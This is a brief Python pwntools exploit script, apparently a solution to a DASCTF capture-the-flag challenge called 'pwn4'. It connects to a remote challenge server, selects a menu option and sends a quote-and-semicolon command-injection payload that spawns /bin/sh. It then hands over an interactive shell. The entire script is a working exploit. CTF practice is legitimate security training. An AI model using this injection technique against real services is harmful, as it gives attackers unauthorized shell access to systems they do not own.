from pwn import *

# p = process("./pwn4")
p = remote('tcp.cloud.dasctf.com',24504)

p.recvuntil("4. Exit\n")
p.sendline("2")
p.recvuntil("echo items :\n")
payload = "\";/bin/sh"
p.sendline(payload)

p.interactive()